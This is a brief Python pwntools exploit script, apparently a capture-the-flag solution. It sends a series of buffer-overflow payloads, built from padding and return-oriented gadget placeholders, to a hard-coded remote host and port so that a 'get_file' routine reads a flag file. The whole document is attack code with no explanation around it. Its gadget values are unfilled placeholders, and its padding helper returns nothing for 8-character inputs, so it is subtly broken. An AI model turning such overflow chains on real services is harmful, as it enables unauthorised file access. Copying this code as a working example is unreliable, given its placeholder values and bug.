#!/usr/bin/env python2
from pwn import *
import sys
#context.log_level = 'error'
HOST = '128.199.104.41'
PORT = 29661
BINARY = ''

def pad(str):
    if len(str)!=8:
        str = str+' '*(8-len(str))
        return str


def exploit(p, local=True):
    #Where you put the exploit
    pop_rdi = 'gadget_1'
    pop_rsi = 'gadget_2'
    pop_rdx = 'gadget_3'
    test = 'gadget_4'
    get_file = 'get_file'
    padding = 'A'*32

    payload1 = ''
    payload1 += padding
    payload1 += pop_rdi
    payload1 += pad('flag')
    payload1 += pad('vuln')
    p.recvuntil('~')
    p.sendline(payload1)

    payload2 = ''
    payload2 += padding
    payload2 += pop_rsi
    payload2 += pad('r')
    payload2 += pad('vuln')
    p.sendline(payload2)

    payload3 = ''
    payload3 += padding
    payload3 += pop_rdx
    payload3 += pad("128")
    payload3 += pad('vuln')
    p.sendline(payload3)
    
    payload4 = ''
    payload4 += padding
    payload4 += get_file
    p.sendline(payload4)

    p.interactive()


if __name__ == "__main__":
    if (len(sys.argv) == 2):
        # remote
        r = remote(HOST, PORT)
        exploit(r,False)
    else:
        # local
        p = process(BINARY)
        exploit(p)